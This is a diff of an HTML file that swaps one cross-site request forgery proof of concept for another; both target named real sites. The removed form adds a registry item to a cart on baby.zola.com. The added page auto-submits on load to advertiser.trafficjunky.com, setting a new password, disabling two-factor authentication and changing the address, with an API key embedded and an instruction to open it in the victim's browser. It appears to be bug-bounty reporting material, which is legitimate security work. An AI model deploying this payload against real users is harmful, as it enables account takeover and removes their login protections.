@@ -1,13 +1,30 @@
 <!doctype html>
 <html>
-  <body>
-    <!-- Pure HTML CSRF PoC (no JS, no CORS, minimal) -->
-    <!-- Open this while logged in to baby.zola.com and click the button -->
-    <form action="https://baby.zola.com/web-registry-api/v1/cart/item" method="POST">
-      <input type="hidden" name="sku_id" value="65f12ea06b4d027a218b613b">
-      <input type="hidden" name="quantity" value="1">
-      <input type="hidden" name="item_origin" value="BABY_REGISTRY">
-      <input type="submit" value="Submit CSRF">
-    </form>
-  </body>
+<head>
+  <meta charset="utf-8" />
+  <title>CSRF PoC — no token</title>
+</head>
+<body onload="document.forms[0].submit()">
+  <!--
+    Save this file as csrf_no_token.html and open it in the victim's browser
+    while they are logged into the target site.
+  -->
+  <form method="POST" action="https://advertiser.trafficjunky.com/member/profile/save-account" >
+    <input type="hidden" name="_currentUrl" value="http://advertiser.trafficjunky.com/my-profile-account">
+    <input type="hidden" name="old_password" value="">
+    <input type="hidden" name="new_password" value="Abc123!test">
+    <input type="hidden" name="new_password_confirmation" value="Abc123!test">
+    <input type="hidden" name="two_factor_authentication" value="0">
+    <input type="hidden" name="otp" value="">
+    <input type="hidden" name="address" value="Attacker Address">
+    <input type="hidden" name="password" value="">
+    <input type="hidden" name="login_alerts" value="1">
+    <!-- api_key or other params from your captured request -->
+    <input type="hidden" name="api_key" value="f95cf73f9f8bf62317e2b17566be04ca8f0e856d">
+    <noscript>
+      <p>JavaScript is disabled — press the button to submit.</p>
+      <button type="submit">Submit</button>
+    </noscript>
+  </form>
+</body>
 </html>
